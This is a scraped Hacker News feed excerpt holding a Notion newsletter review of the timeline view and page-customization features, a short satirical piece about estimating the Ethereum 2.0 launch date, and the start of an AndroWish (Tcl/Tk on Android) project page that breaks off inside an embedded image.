Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25061649">thread link</a>) | @saviorand
<br/>
November 11, 2020 | https://optemization.com/timeline-view-notion | <a href="https://web.archive.org/web/*/https://optemization.com/timeline-view-notion">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><article id="block-timeline-view-notion"><blockquote id="block-659ced01cffc486ca3fa1b6e01fb482d"><span><span>It's about time: gantt charts, page customization and more arrive to Notion —
here's our breakdown.</span></span></blockquote><div id="block-9ce0f17fa5904c5ba88176d78f03d8ff"><div id="block-f4c2486805a1467cb60c4a5aa1db40e5"><p><span><span>Hello there! Welcome to </span><span><em>Digital Opsessions</em></span><span> issue #0003</span></span></p></div></div><div id="block-e49dbd8e89f34444b7a9118c475aa629"><div id="block-2c66366dc9994fae8d874f1f30735471"><p><span><span>Today, marvelous talents at Notion decided to make it a bright Wednesday for us and share three major updates in the app! As part of the Notion Ambassadors group, we were fortunate enough to beta test these features and help spread the announcement news. </span></span></p><p><span><span>Here's what's up </span></span></p></div></div><div id="block-d85f6c16c65a4a098d6794d204a0267b"><div id="block-67d522c072b8469b8543221c3b19634a"><p><span><span>It has been a loooong dark 469 days since this Tweet has swept the world of project management. Frankly, it feels like the gap between season seven and season eight of the Game of Thrones. Only this time, you're going to be very happy. </span></span></p><p><span><span>Now that I think about it: Pfizer's vaccine announcement to COVID-19 is like Arya to the Night King (if you know what I mean — </span><span><span><span>no spoilers</span></span></span><span>). </span></span></p></div></div><h2 id="block-8854e6d47bc8427ba082691fcd7e95e6"><span id="8854e6d47bc8427ba082691fcd7e95e6"></span><span><span>How to Timeline View</span></span></h2><p><span><span>Starting today, you will see the timeline view option show up in all your databases and linked database views. This is how it looks like:</span></span></p><div id="block-cb36fbb3f3d742e59a7052a3434dc403"><picture><source srcset="https://api.super.so/asset/optemization.com/d9fb8f55-918d-4d1d-8f1a-b07973ad41e9.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/d9fb8f55-918d-4d1d-8f1a-b07973ad41e9.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/d9fb8f55-918d-4d1d-8f1a-b07973ad41e9.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/d9fb8f55-918d-4d1d-8f1a-b07973ad41e9.png?w=1500" alt="image" loading="lazy"></picture></div><p><span><span>Here are some main configuration options to be aware of.</span></span></p><h3 id="block-3a98d91ea0c7408b9d38b302d0a9cf96"><span id="3a98d91ea0c7408b9d38b302d0a9cf96"></span><span><span>Timeline by</span></span></h3><p><span><span>Just like with board and calendar views, you can choose what dates the Timeline view indexes by. </span></span></p><div id="block-056fc67a35f34ed38fe2deff5ea12a8b"><picture><source srcset="https://api.super.so/asset/optemization.com/77a66cc4-c069-4f8c-8a2a-066b925dad3b.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/77a66cc4-c069-4f8c-8a2a-066b925dad3b.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/77a66cc4-c069-4f8c-8a2a-066b925dad3b.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/77a66cc4-c069-4f8c-8a2a-066b925dad3b.gif?w=1500" alt="image" loading="lazy"></picture></div><p><span><span>In our case, we're arranging our content calendar by two date properties. To do that, toggle the </span><span><code>use separate start and end dates</code></span><span> option. We also like to enter both start and end dates in one property, but needed filtered visibility in the view. 
So we added a two simple formula properties:</span></span></p><ol><li id="block-f89f02f1bac2425789e0f9ecddeee9f4"><span><span>Start date: </span><span><code>start(prop("Promotion Dates"))</code></span></span></li><li id="block-7861a869b8284263831a9a9b58104177"><span><span>End date </span><span><code>end(prop("Promotion Dates"))</code></span></span></li></ol><div id="block-afad72a4ccbe4f1580bd7a0f1f142601"><p><span><span>Note that the "timeline by" setting will </span><span><strong>not</strong></span><span> sort your records chronologically by default. You need to enable this option if you need it.</span></span></p></div><h3 id="block-afa3f89aff864e099417bc191809b611"><span id="afa3f89aff864e099417bc191809b611"></span><span><span>Show table </span></span></h3><p><span><span>For the first time in Notion databases-and-views history you can fully hide the table! That comes in handy with timeline view — if you just want to see that beautiful timeline. 
You'll also notice that you can limit the amount of records that show up without filtering, but more on that below</span></span></p><div id="block-2f1dc0d7047146d095c018880c646883"><picture><source srcset="https://api.super.so/asset/optemization.com/35e655b8-664c-4b96-8db3-239615ae3184.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/35e655b8-664c-4b96-8db3-239615ae3184.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/35e655b8-664c-4b96-8db3-239615ae3184.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/35e655b8-664c-4b96-8db3-239615ae3184.gif?w=1500" alt="image" loading="lazy"></picture></div><h2 id="block-2f419ddfbd474c8e9744b4b41831f8f7"><span id="2f419ddfbd474c8e9744b4b41831f8f7"></span><span><span>The Good / The Bad</span></span></h2><div id="block-98a043c9f3d54cbfaf16507beddb2f56"><picture><source srcset="https://api.super.so/asset/optemization.com/a4e87755-cc22-423d-9d79-877a3650d6b7.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/a4e87755-cc22-423d-9d79-877a3650d6b7.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/a4e87755-cc22-423d-9d79-877a3650d6b7.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/a4e87755-cc22-423d-9d79-877a3650d6b7.png?w=1500" alt="image" loading="lazy"></picture></div><h3 id="block-3595a6e3558e48f9815ea8277e41a6dd"><span id="3595a6e3558e48f9815ea8277e41a6dd"></span><span><span>Things we love</span></span></h3><p><span><span><strong>Moving multiple date-specific records is seamless</strong></span><span>. Now, if you need to adjust a project timeline that has multiple pieces to it, whether its tasks, milestones, or events, you can just select them all, drag and all the dates will adjust accordingly. We use this, for example, to adjust whole complex project schedules to start from a given date — very handy!</span></span></p><div id="block-633f34747c1f45bb9bcd4b392939fe48"><picture><source srcset="https://api.super.so/asset/optemization.com/add5b1ab-14c2-485d-812f-809bf50c452f.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/add5b1ab-14c2-485d-812f-809bf50c452f.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/add5b1ab-14c2-485d-812f-809bf50c452f.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/add5b1ab-14c2-485d-812f-809bf50c452f.gif?w=1500" alt="image" loading="lazy"></picture></div><p><span><span><strong>Hiding the property table is possible! </strong></span><span>If you'd like to see the timeline view in its full glory you can now toggle the table on and off. In the other Notion views, you cannot hide the main "Name" / ID property. </span></span></p><div id="block-50d1fed52f7c4101beb7d215660af070"><picture><source srcset="https://api.super.so/asset/optemization.com/9ba9dc57-2389-40b4-84ca-c93bdc43ab4a.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/9ba9dc57-2389-40b4-84ca-c93bdc43ab4a.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/9ba9dc57-2389-40b4-84ca-c93bdc43ab4a.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/9ba9dc57-2389-40b4-84ca-c93bdc43ab4a.gif?w=1500" alt="image" loading="lazy"></picture></div><p><span><span><strong>You can timeline by separate properties. </strong></span><span>The default Notion date property does not allow filtering or sorting by the date range. It uses the start date. That can be tricky and annoying when you want to filter your timeline view. Luckily, you have the option to timeline by separate fields!</span></span></p><div id="block-e347aea8615f4fb68f3dd07579d1d4af"><picture><source srcset="https://api.super.so/asset/optemization.com/b681c448-961e-438f-98b3-4977ca6ee06f.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/b681c448-961e-438f-98b3-4977ca6ee06f.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/b681c448-961e-438f-98b3-4977ca6ee06f.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/b681c448-961e-438f-98b3-4977ca6ee06f.gif?w=1500" alt="image" loading="lazy"></picture></div><h3 id="block-b01c6b44c6eb42b8a0e4d062c85b586f"><span id="b01c6b44c6eb42b8a0e4d062c85b586f"></span><span><span>Things we hate</span></span></h3><p><span><span><strong>Data overflow: </strong></span><span>Items look bad when you show more than one property in the timeline, or when an event takes place on a single day (then item is just a small white dot, and text overflows). When more than a few properties toggled on the timeline, the UI of each becomes visible cluttered. For both the table and timeline, a "wrap cells" options would be great.</span></span></p><div id="block-b126bbb5b6e546db81fe1c95982de683"><picture><source srcset="https://api.super.so/asset/optemization.com/875b03db-e9f6-4958-bbf0-a9942da504af.png?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/875b03db-e9f6-4958-bbf0-a9942da504af.png?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/875b03db-e9f6-4958-bbf0-a9942da504af.png?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/875b03db-e9f6-4958-bbf0-a9942da504af.png?w=1500" alt="image" loading="lazy"></picture></div><p><span><span><strong>Only full width. C</strong></span><span>urrently timelines with a table toggles "on", do not adjust to standard width.That's annoying because for some it might be useful to see the table and timeline on the standard width.</span></span></p><div id="block-9c638003ac144730b036479a2d56bf6c"><picture><source srcset="https://api.super.so/asset/optemization.com/b0d2431d-bdc3-4125-9edd-17549894a669.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/b0d2431d-bdc3-4125-9edd-17549894a669.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/b0d2431d-bdc3-4125-9edd-17549894a669.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/b0d2431d-bdc3-4125-9edd-17549894a669.gif?w=1500" alt="image" loading="lazy"></picture></div><p><span><span><strong>Paid plans limits</strong></span></span></p><div id="block-4058fc818edf482ab647cb0d6a4790ba"><div id="block-6c4afe4fb0934ecba8c9d341c6e955e9"><div id="block-6fc04eb8d9bf427c81b524a58a270ae5"><picture><source srcset="https://api.super.so/asset/optemization.com/9322832a-461e-4806-bc46-4be82e9cfd4e.png?w=434&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/9322832a-461e-4806-bc46-4be82e9cfd4e.png?w=434" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/9322832a-461e-4806-bc46-4be82e9cfd4e.png?w=434&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/9322832a-461e-4806-bc46-4be82e9cfd4e.png?w=434" alt="image" loading="lazy"></picture></div></div><div id="block-ad57120d749247d08823002a95441e09"><p><span><span>With the introduction of Timelines, Notion team added a new pricing tweak — a limit on the number of Timelines you can use. You can only add 3 timelines on a Personal plan and up to 5 on Team plan. For unlimited timelines you have to buy Enterprise</span></span></p></div></div><p><span><span>We managed to lay our hands on the Timeline view before the release, and had the chance to prepare this proposal template with a Gantt chart included!</span></span></p><p><span><span>It's easy to try — just duplicate it into your workspace and drag all milestones, meetings, deliverables and billing activities to your project's start date. Voila! You now have a complete, detailed project schedule aligned with your preferred dates.</span></span></p><p><span><span>You can change any part of this template — remove or add new records, change default structure, introduce new types of project activities, such as legal (marking the date when the contract is signed), holidays, events.</span></span></p><p><span><span>We use this template ourselves to spin up new client proposals — it saves tons of time on routine editing and allows us to focus on things that are essential, like pain points we help clients address, or our unique approach. </span></span></p><p><span><span>Making these kinds of documents in Notion is enjoyable — you can templatize pretty much any common structure. If the lack of Gantt Charts is something that was stopping you from going all-in on Notion, now is the time. </span></span></p><h2 id="block-3c4bd798e6b34e7abd3977fbe0825efb"><span id="3c4bd798e6b34e7abd3977fbe0825efb"></span><span><span>Get the template!</span></span></h2><h3 id="block-f851a8c9110c4392a445c1f5aa42fd57"><span id="f851a8c9110c4392a445c1f5aa42fd57"></span><span><span>Properties</span></span></h3><p><span><span>Power users know that complex. data-heavy workflows in Notion were tough to work with so far. When making structures that's more sophisticated than a simple "Basic CRM" workflow, properties tend to pile up — at some point, when opening a page, you don't see its content on the first screen, just properties.</span></span></p><p><span><span>Not anymore! Now you can hide properties you don't use and get straight to that page content every time you open a page. </span></span></p><div id="block-1fd0baefcc3d4939af7c1f0dcf418a19"><picture><source srcset="https://api.super.so/asset/optemization.com/52e79bf6-392b-4d85-911f-2660d3d4d596.png?w=406&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/52e79bf6-392b-4d85-911f-2660d3d4d596.png?w=406" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/52e79bf6-392b-4d85-911f-2660d3d4d596.png?w=406&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/52e79bf6-392b-4d85-911f-2660d3d4d596.png?w=406" alt="image" loading="lazy"></picture></div><p><span><span>The best part is that you can set up advanced rules on when to show or hide specific properties — for example, you can show a property only when it's not empty for the current page, or always hide a specific property on a page (you can always open it up manually).</span></span></p><div id="block-6b34b9caaab340d9a69316d845cee4cb"><picture><source srcset="https://api.super.so/asset/optemization.com/1d64c6a2-b8d3-4a5c-923f-f2bff59e5179.png?w=350&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/1d64c6a2-b8d3-4a5c-923f-f2bff59e5179.png?w=350" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/1d64c6a2-b8d3-4a5c-923f-f2bff59e5179.png?w=350&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/1d64c6a2-b8d3-4a5c-923f-f2bff59e5179.png?w=350" alt="image" loading="lazy"></picture></div><h3 id="block-e0e751d263f64ecc9596b3e091381dd9"><span id="e0e751d263f64ecc9596b3e091381dd9"></span><span><span>Comments, Backlinks</span></span></h3><p><span><span>It's simple with comments — you can just hide them for a page. Same with backlinks, but you can also select "Show in a popover". That option will display a small "X backlinks" button indicating how many backlinks a page has. Then you can press that button and view the backlinks.</span></span></p><div id="block-3e1f67ea498d4fa0ad79e33295222f8e"><picture><source srcset="https://api.super.so/asset/optemization.com/d7e691c5-25eb-433d-82a9-0d35f6b7fb0d.png?w=320&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/d7e691c5-25eb-433d-82a9-0d35f6b7fb0d.png?w=320" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/d7e691c5-25eb-433d-82a9-0d35f6b7fb0d.png?w=320&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/d7e691c5-25eb-433d-82a9-0d35f6b7fb0d.png?w=320" alt="image" loading="lazy"></picture></div><p><span><span>This functionality allows to keep any workspace clean, and the main use case is for large organizations managing tons of data. </span></span></p><p><span><span>Previously, when you shared access to a page with someone, they would automatically get access to all the subpages in it. Now when you open up a subpage you can see exactly what page it inherits permissions form — and then change permissions for this specific subpage.</span></span></p><div id="block-87a9344e6a4a4313aaa9430e7ef34cdc"><picture><source srcset="https://api.super.so/asset/optemization.com/af87fb42-e8d3-4377-b5e7-d7eab0996d37.png?w=620&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/af87fb42-e8d3-4377-b5e7-d7eab0996d37.png?w=620" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/af87fb42-e8d3-4377-b5e7-d7eab0996d37.png?w=620&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/af87fb42-e8d3-4377-b5e7-d7eab0996d37.png?w=620" alt="image" loading="lazy"></picture></div><p><span><span>This is useful when you have private pages that live inside a larger page — and you want to share the parent one without sharing these specific private pages. Think company's internal wiki with a subpage that contains sensitive data. </span></span></p><p><span><span>You can also add group permissions — Notion team mentions the use case of giving Engineering team access to most of the workspace except a couple read-only pages.</span></span></p><p><span><span>Notion will now show you a "Show X records" option when working with database settings — and will clip all the records above the number selected. Previously, if you had a huge database, it will display all the records in an infinite scroll as you move down the page — this might have been okay for small databases, but quickly got hard to manage with additional information load.</span></span></p><p><span><span>Timeline view, page customization, advanced permissions and row number limits — all of this seems to be targeting enterprise users, who need more control over large setups, Notion team is obviously hitting the nerve with big teams here. </span></span></p><p><span><span>Some features will also be handy for small teams and individual makers — authors can use the timeline view to manage their content editorial, freelancers can use it to control their work load. Advanced customization is valuable for anyone who keeps data in Notion.</span></span></p><div id="block-35eebc7612e34ff79f23e056bf85977e"><div id="block-ca65c34a263e4c7881ef4767fca59df4"><p><span><span>The </span><span><em>Digital Opsessions</em></span><span> newsletter helps you figure out how to use digital productivity systems, tools and habits to free up time, energy and focus </span><span><span>for more important or fun </span></span><span>things in life.</span></span></p><p><span><span><strong>Subscribe + share</strong></span><span> </span><span><span><span>(if you haven't already)</span></span></span><span> 👉</span></span></p></div></div></article></div></div></div>]]>
            </description>
            <link>https://optemization.com/timeline-view-notion</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061649</guid>
            <pubDate>Wed, 11 Nov 2020 19:05:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mathematicians Estimate Ethereum 2.0 Launch Date]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25061381">thread link</a>) | @npguy
<br/>
November 11, 2020 | https://doublespend.io/2020/10/28/breakthrough-mathematicians-estimate-ethereum-2-0-launch-date/ | <a href="https://web.archive.org/web/*/https://doublespend.io/2020/10/28/breakthrough-mathematicians-estimate-ethereum-2-0-launch-date/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

			
<article id="post-445">
	
				<p><a href="https://doublespend.io/wp-content/uploads/2020/10/eth2.jpg"><img width="800" height="445" src="https://doublespend.io/wp-content/uploads/2020/10/eth2-800x445.jpg" alt="" loading="lazy" srcset="https://doublespend.io/wp-content/uploads/2020/10/eth2.jpg 800w, https://doublespend.io/wp-content/uploads/2020/10/eth2-300x167.jpg 300w, https://doublespend.io/wp-content/uploads/2020/10/eth2-768x427.jpg 768w" sizes="(max-width: 800px) 100vw, 800px"></a>
								</p>
			
	<div>

		
		

		
		<div>
			
<p>A group of elite mathematicians have finally solved a problem that has puzzled millions of crypto folks for about two decades now. “It took us about four years to get here, but man does it feel good” John Calculus, the lead mathematician, told DoubleSpend. </p>



<p>“I was working on the P versus NP problem for about 10 years before moving onto solving two problems in parallel: discovering the largest prime number, and estimating the launch date of Ethereum 2.0. But when&nbsp;<a href="http://www.sciencedaily.com/releases/2013/02/130213225424.htm">Curtis Cooper beat me</a>&nbsp;to discovering the largest known prime number, I started focusing on the Ethereum 2.0 problem one hundred percent” a visibly excited John Calculus told our reporter.</p>
		</div>

	</div>

	</article>

		</div></div>]]>
            </description>
            <link>https://doublespend.io/2020/10/28/breakthrough-mathematicians-estimate-ethereum-2-0-launch-date/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061381</guid>
            <pubDate>Wed, 11 Nov 2020 18:41:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AndroWish – run desktop Tcl/Tk programs almost unaltered on the Android Platform]]>
            </title>
            <description>
<![CDATA[
Score 67 | Comments 20 (<a href="https://news.ycombinator.com/item?id=25061292">thread link</a>) | @jakobdabo
<br/>
November 11, 2020 | https://www.androwish.org/index.html/home | <a href="https://web.archive.org/web/*/https://www.androwish.org/index.html/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<tbody><tr><td>
<p>Tcl (Tool Command Language) is a very powerful but easy to learn dynamic programming language, suitable for a very wide range of uses, including web and desktop applications, networking, administration, testing and many more. Open source and business-friendly, Tcl is a mature yet evolving language that is truly cross platform, easily deployed and highly extensible.

</p><p>Tk is a graphical user interface toolkit that takes developing desktop applications to a higher level than conventional approaches. Tk is the standard GUI not only for Tcl, but for many other dynamic languages, and can produce rich, native applications that run unchanged across Windows, Mac OS X, Linux and more. 

</p><p>AndroWish allows to run desktop Tcl and Tk programs almost unaltered on the Android Platform while it opens the door to script a rich feature set of a mobile platform. Its sibling <a href="https://www.androwish.org/index.html/wiki?name=undroidwish">undroidwish</a> uses the same code base and  offers a similar feature set on various desktop and embedded platforms.

</p></td><td>
<img width="160px" height="160px" src="data:image/png;base64,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